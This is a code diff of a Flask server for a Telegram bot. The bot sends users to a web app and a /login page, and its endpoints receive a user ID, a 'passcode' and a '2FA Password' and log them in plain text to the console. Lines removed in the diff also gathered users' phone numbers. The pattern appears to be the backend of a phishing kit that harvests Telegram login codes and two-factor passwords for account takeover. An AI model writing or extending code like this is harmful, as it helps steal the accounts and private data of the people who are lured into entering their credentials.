@@ -3,28 +3,49 @@ import requests
 import os
 
 app = Flask(__name__)
-
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
-if not BOT_TOKEN:
-    raise RuntimeError("❌ BOT_TOKEN not set")
-
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
+
+# Get the current deployment URL from environment or use default
 APP_URL = os.environ.get("APP_URL", "https://tgbot-gllp.onrender.com")
 
-# === SETUP WEBHOOK ===
+# === Setup webhook ===
 @app.route("/setup_webhook")
 def setup_webhook():
+    """Setup the Telegram webhook - visit this URL once after deployment"""
+    if not BOT_TOKEN:
+        return jsonify({"error": "BOT_TOKEN not set"}), 500
+    
     webhook_url = f"{APP_URL}/"
-    response = requests.post(f"{TELEGRAM_API}/setWebhook", json={"url": webhook_url})
+    response = requests.post(
+        f"{TELEGRAM_API}/setWebhook",
+        json={"url": webhook_url}
+    )
+    
+    result = response.json()
+    return jsonify({
+        "webhook_url": webhook_url,
+        "telegram_response": result
+    })
+
+@app.route("/webhook_info")
+def webhook_info():
+    """Check current webhook status"""
+    if not BOT_TOKEN:
+        return jsonify({"error": "BOT_TOKEN not set"}), 500
+    
+    response = requests.get(f"{TELEGRAM_API}/getWebhookInfo")
     return jsonify(response.json())
 
-# === MAIN WEBHOOK ===
+# === Telegram Webhook ===
+# === Telegram Webhook ===
 @app.route("/", methods=["POST"])
 def webhook():
     update = request.get_json(force=True, silent=True)
-    print("=" * 60, flush=True)
-    print("📨 Telegram update:", update, flush=True)
-    print("=" * 60, flush=True)
+    print("=" * 50, flush=True)
+    print("📨 Received webhook update:", flush=True)
+    print(update, flush=True)
+    print("=" * 50, flush=True)
 
     if not update or "message" not in update:
         return jsonify({"ok": True})
@@ -36,92 +57,85 @@ def webhook():
     # Handle /start command
     if text == "/start":
         webapp_url = f"{APP_URL}/webapp"
-        reply_markup = {
-            "keyboard": [
-                [{"text": "🌐 Open WebApp", "web_app": {"url": webapp_url}}],
-                [{"text": "📞 Share Contact", "request_contact": True}]
-            ],
-            "resize_keyboard": True,
-            "one_time_keyboard": False
+
+        # ✅ Inline keyboard with WebApp button
+        keyboard = {
+            "inline_keyboard": [[{
+                "text": "🌐 Open WebApp",
+                "web_app": {"url": webapp_url}
+            }]]
         }
 
+        # ✅ Send message with WebApp button
         payload = {
             "chat_id": chat_id,
-            "text": "👋 Welcome!\n\nYou can either open the WebApp or share your contact:",
-            "reply_markup": reply_markup
+            "text": (
+                "👋 Welcome!\n\n"
+                "Tap the button below to open the WebApp 👇"
+            ),
+            "reply_markup": keyboard
         }
-        res = requests.post(f"{TELEGRAM_API}/sendMessage", json=payload)
-        print("📤 Sent /start message:", res.text, flush=True)
 
-    # Handle contact shared by user
-    elif "contact" in message:
-        contact = message["contact"]
-        phone = contact.get("phone_number")
-        name = contact.get("first_name")
-        requests.post(f"{TELEGRAM_API}/sendMessage", json={
-            "chat_id": chat_id,
-            "text": f"📱 Thanks {name}! Your number {phone} was received."
-        })
-        print(f"✅ Received contact: {name} ({phone})", flush=True)
+        print(f"📤 Sending WebApp button with URL: {webapp_url}", flush=True)
+        r = requests.post(f"{TELEGRAM_API}/sendMessage", json=payload)
+        print("📩 Telegram API response:", r.text, flush=True)
 
     return jsonify({"ok": True})
 
 
-# === FRONTEND ROUTES ===
+# === WebApp UI ===
 @app.route("/webapp")
-def webapp_page():
+def webapp():
     return render_template("index.html")
 
-@app.route("/login")
-def login_page():
-    return render_template("login.html")
+@app.route('/login')
+def login_screen():
+    return render_template('login.html')
 
-
-# === DATA ENDPOINTS ===
+# === Receive data from WebApp ===
 @app.route("/send_data", methods=["POST"])
 def send_data():
     data = request.get_json()
-    user_id = data.get("user_id")
-    passcode = data.get("passcode")
+    
+    # Print received data to console
+    print("=" * 50, flush=True)
+    print("📨 Received from webapp:", flush=True)
+    print(f"   User ID: {data.get('user_id')}", flush=True)
+    print(f"   Passcode: {data.get('passcode')}", flush=True)
+    print(f"   Full data: {data}", flush=True)
+    print("=" * 50, flush=True)
 
-    print(f"📩 Passcode received from {user_id}: {passcode}", flush=True)
-
-    if user_id and passcode:
-        requests.post(f"{TELEGRAM_API}/sendMessage", json={
-            "chat_id": user_id,
-            "text": "✅ Passcode received!"
-        })
-
-    return jsonify({"ok": True})
+    return jsonify({"ok": True, "status": "received"})
 
 
+# === Receive 2FA data from WebApp ===
 @app.route("/send_twofactor", methods=["POST"])
 def send_twofactor():
     data = request.get_json()
-    user_id = data.get("user_id")
-    twofactor = data.get("twofactor")
+    
+    # Print received data to console
+    print("=" * 50, flush=True)
+    print("🔐 Received 2FA from webapp:", flush=True)
+    print(f"   User ID: {data.get('user_id')}", flush=True)
+    print(f"   2FA Password: {data.get('twofactor')}", flush=True)
+    print(f"   Full data: {data}", flush=True)
+    print("=" * 50, flush=True)
 
-    print(f"🔐 2FA from {user_id}: {twofactor}", flush=True)
-
-    if user_id and twofactor:
-        requests.post(f"{TELEGRAM_API}/sendMessage", json={
-            "chat_id": user_id,
-            "text": "🔐 2FA password received!"
-        })
-
-    return jsonify({"ok": True})
+    return jsonify({"ok": True, "status": "received"})
 
 
 @app.route("/status")
-def status():
+def index():
+    bot_status = "✅ BOT_TOKEN is set" if BOT_TOKEN else "❌ BOT_TOKEN not set"
     return f"""
-    <h1>Telegram Bot Server</h1>
-    <p>✅ BOT_TOKEN set</p>
-    <p>🌐 WebApp: <a href="{APP_URL}/webapp">{APP_URL}/webapp</a></p>
+    <h1>Telegram Bot Server Status</h1>
+    <p>✅ Server is running</p>
+    <p>{bot_status}</p>
+    <p>📱 WebApp URL: {APP_URL}/webapp</p>
     <hr>
-    <a href="/setup_webhook">Setup Webhook</a>
+    <p><a href="/webhook_info">Check Webhook Status</a></p>
+    <p><a href="/setup_webhook">Setup Webhook</a></p>
     """
-
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
